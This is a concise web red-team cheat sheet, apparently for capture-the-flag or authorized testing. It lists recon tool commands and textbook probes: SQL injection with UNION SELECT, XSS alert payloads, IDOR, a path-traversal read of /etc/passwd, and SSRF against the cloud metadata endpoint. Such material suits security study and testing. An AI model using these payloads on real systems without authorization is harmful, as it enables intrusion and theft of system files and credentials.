# Web Tools — Red Team Guide

## 60-Second Decision Tree

    What did they give you?
    ├── A URL with login form → Try SQLi or default creds
    ├── A URL with search box → Try XSS or SQLi
    ├── A URL with params (?id=) → Try IDOR, SQLi, LFI
    ├── Source code → Read the code
    └── API endpoint → Test with curl

## Tools & Install

### subfinder
    go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
    subfinder -d target.com -silent -o subs.txt

### httpx
    go install github.com/projectdiscovery/httpx/cmd/httpx@latest
    cat subs.txt | httpx -silent -title -tech-detect -o live.txt

### ffuf
    ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -ac

### gau
    echo target.com | gau --threads 5 > urls.txt

## Vulnerability Playbook

### 1. SQL Injection
    curl -s "https://target.com/product?id=1'"
    curl -s "https://target.com/product?id=1' ORDER BY 1--"
    curl -s "https://target.com/product?id=-1' UNION SELECT 1,version(),3--"

### 2. XSS
    <script>alert(1)</script>
    <img src=x onerror=alert(1)>

### 3. IDOR
    curl -s "https://target.com/api/user/1002" -H "Cookie: session=YOUR_SESSION"

### 4. LFI
    curl -s "https://target.com/?page=../../../../etc/passwd"

### 5. SSRF
    curl -s "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

## Critical Tips
1. Check robots.txt first
2. Test with Burp Suite
3. Check /admin, /api, /backup, /.git
4. If >15 min, move on

## Links
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- PortSwigger Academy: https://portswigger.net/web-security
